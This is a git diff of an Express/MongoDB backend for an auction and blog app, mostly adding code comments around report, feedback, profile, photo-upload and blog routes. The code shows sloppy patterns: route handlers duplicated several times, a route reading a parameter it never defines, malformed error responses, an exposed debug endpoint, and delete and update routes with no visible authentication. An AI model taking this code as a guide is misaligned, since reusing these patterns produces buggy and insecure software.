       const query = auctionId ? { auctionId } : {};
@@ -1397,6 +1419,7 @@ async function run() {
       res.send(result);
     });
 
+    // Reports API
     app.post("/reports", async (req, res) => {
       try {
         const reports = req.body;
@@ -1406,6 +1429,7 @@ async function run() {
         res.status(500).send("internal server error", error);
       }
     });
+    // GET a report(Joyeta)
     app.get("/reports", async (req, res) => {
       try {
         const reports = await reportCollection.find().toArray();
@@ -1417,6 +1441,7 @@ async function run() {
       }
     });
 
+    // POST a report (Joyeta)
     app.post("/reports", async (req, res) => {
       try {
         const report = req.body;
@@ -1434,6 +1459,8 @@ async function run() {
       }
     });
 
+    //feedback get method
+
     app.get("/feedbacks", async (req, res) => {
       try {
         const feedbacks = await feedbackCollection.find().toArray();
@@ -1442,6 +1469,8 @@ async function run() {
         res.status(500).send("internal server error", error);
       }
     });
+
+    //feedback post api
 
     app.post("/feedback", async (req, res) => {
       try {
@@ -1456,6 +1485,7 @@ async function run() {
       }
     });
 
+    // POST a report (Joyeta)
     app.post("/reports", async (req, res) => {
       try {
         const report = req.body;
@@ -1473,6 +1503,8 @@ async function run() {
       }
     });
 
+    //feedback get method
+
     app.get("/feedbacks", async (req, res) => {
       try {
         const feedbacks = await feedbackCollection.find().toArray();
@@ -1481,6 +1513,8 @@ async function run() {
         res.status(500).send("internal server error", error);
       }
     });
+
+    //feedback post api
 
     app.post("/feedback", async (req, res) => {
       try {
@@ -1494,6 +1528,13 @@ async function run() {
         res.status(500).send("internal server error", error);
       }
     });
+    // cover collection api
+    // app.post("/cover", async (req, res) => {
+    //   const feedback = req.body;
+
+    //   const result = await CoverCollection.insertOne(feedback);
+    //   res.status(200).send({ success: true, result });
+    // });
 
     app.patch("/cover", async (req, res) => {
       const userId = req.params.id;
@@ -1503,9 +1544,11 @@ async function run() {
       const result = await userCollection.updateOne(filter, updateDoc);
       res.send(result);
     });
+    // Update user profile
     app.patch("/user/:email", async (req, res) => {
       const email = req.params.email;
       const updates = req.body;
+      // List of allowed fields to update
       const allowedFields = [
         "name",
         "email",
@@ -1523,6 +1566,7 @@ async function run() {
         "watchingNow",
       ];
 
+      // Filter updates to only include allowed fields
       const filteredUpdates = Object.keys(updates)
         .filter((key) => allowedFields.includes(key))
         .reduce((obj, key) => {
@@ -1545,6 +1589,7 @@ async function run() {
       }
     });
 
+    // Update cover photo
     app.patch("/cover/:id", async (req, res) => {
       const userId = req.params.id;
       const { cover } = req.body;
@@ -1562,12 +1607,14 @@ async function run() {
       }
     });
 
+    // Upload photo
     app.post("/upload-photo", upload.single("photo"), async (req, res) => {
       try {
         const photo = req.file;
         if (!photo) {
           return res.status(400).send({ message: "No photo uploaded" });
         }
+        // Upload to Cloudinary
         const uploadResult = await new Promise((resolve, reject) => {
           cloudinary.uploader
             .upload_stream({ resource_type: "image" }, (error, result) => {
@@ -1590,6 +1637,22 @@ async function run() {
         res.status(500).send("internal server error", error);
       }
     });
+    // app.get("/cover/:userId", async (req, res) => {
+    //   try {
+    //     const userId = req.query.userId; // Get userId from query parameters
+    //     const query = { userId: userId };
+
+    //     const result = await CoverCollection.findOne(query);
+    //     if (result) {
+    //       res.status(200).send(result);
+    //     } else {
+    //       res.status(404).send({ message: "Cover not found" });
+    //     }
+    //   } catch (error) {
+    //     res.status(500).send({ message: "Internal server error", error });
+    //   }
+    // });
+    // Debug endpoint to check active socket connections
     app.get("/debug/socket-connections", (req, res) => {
       const connections = Array.from(io.sockets.sockets).map(
         ([id, socket]) => ({
@@ -1606,14 +1669,15 @@ async function run() {
 
     app.get("/allBlogs", async (req, res) => {
       try {
-        const blogs = await blogCollection.find().toArray();
+        const blogs = await blogCollection.find().toArray(); // Adjust to your actual schema or data retrieval method
+
         if (!blogs || blogs.length === 0) {
           return res
             .status(404)
             .json({ message: "No blogs found for this email." });
         }
 
-        res.status(200).json(blogs);
+        res.status(200).json(blogs); // Respond with the blogs
       } catch (error) {
         console.error(error);
         res
@@ -1623,18 +1687,19 @@ async function run() {
     });
 
     app.get("/blogs/:email", async (req, res) => {
-      const email = req.params.email;
+      const email = req.params.email; // Extract email parameter from URL
 
       try {
         const query = { authorEmail: email };
-        const blogs = await blogCollection.find(query).toArray();
+        const blogs = await blogCollection.find(query).toArray(); // Adjust to your actual schema or data retrieval method
+
         if (!blogs || blogs.length === 0) {
           return res
             .status(404)
             .json({ message: "No blogs found for this email." });
         }
 
-        res.status(200).json(blogs);
+        res.status(200).json(blogs); // Respond with the blogs
       } catch (error) {
         console.error(error);
         res
@@ -1686,13 +1751,15 @@ async function run() {
       }
     });
 
+    // Ensure that the route matches the one you're calling in the frontend
+
     app.patch("/updateBlog/:id", async (req, res) => {
       const { id } = req.params;
       const { title, fullContent, imageUrls } = req.body;
 
       try {
         const result = await blogCollection.updateOne(
-          { _id: new ObjectId(id) },
+          { _id: new ObjectId(id) }, // match document by id
           {
             $set: {
               title,
@@ -1720,17 +1787,20 @@ async function run() {
     });
 
     app.delete("/delete/:id", async (req, res) => {
-      const { id } = req.params;
+      const { id } = req.params; // Extract the blog post ID from the URL parameter
 
       try {
+        // Attempt to delete the blog post by its ID from the database
         const result = await blogCollection.deleteOne({
           _id: new ObjectId(id),
         });
 
+        // Check if the blog post was found and deleted
         if (result.deletedCount === 0) {
           return res.status(404).json({ message: "Blog post not found." });
         }
 
+        // Respond with a success message if the deletion is successful
         res.status(200).json({ message: "Blog post deleted successfully." });
       } catch (error) {
         console.error("Error deleting blog post:", error);
